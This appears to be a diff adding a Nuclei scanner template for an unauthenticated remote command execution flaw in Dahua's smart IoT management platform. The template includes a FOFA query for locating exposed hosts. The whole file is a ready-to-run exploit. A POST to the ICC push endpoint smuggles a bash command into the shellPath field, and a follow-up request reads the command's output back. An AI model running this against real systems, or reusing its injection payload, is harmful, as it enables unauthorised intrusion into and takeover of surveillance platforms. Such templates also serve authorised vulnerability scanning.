@@ -1,0 +1,51 @@
+id: dahua-icc-push-rce
+
+info:
+  name: 大华智能物联综合管理平台 icc push 远程命令执行漏洞
+  author: unknown
+  severity: high
+  description: |-
+    fofa: body="*客户端会小于800*" || icon_hash="-1935899595"
+    大华智能物联综合管理平台 icc push 接口存在远程命令执行漏洞，未经身份验证的恶意攻击者可以利用该漏洞远程执行任意命令，获取系统权限。
+  tags: RCE
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+  - raw:
+      - |
+        POST /evo-runs/v1.0/push HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
+        Content-Type: application/json
+        X-Subject-Headerflag: ADAPT
+
+        {
+          "method": "agent.ossm.mapping.config",
+          "info": {
+            "configure": "abcd",
+            "filePath": "haha",
+            "paramMap": {
+              "shellPath": "/bin/bash -c id>/opt/evoWpms/static/{{username}}.txt",
+              "filePath": "abc"
+            },
+            "requestIp": ""
+          }
+        }
+      - |
+        GET /static/{{username}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'uid='
+          - 'gid='
+        condition: and
+      - type: status
+        status: 
+          - 200
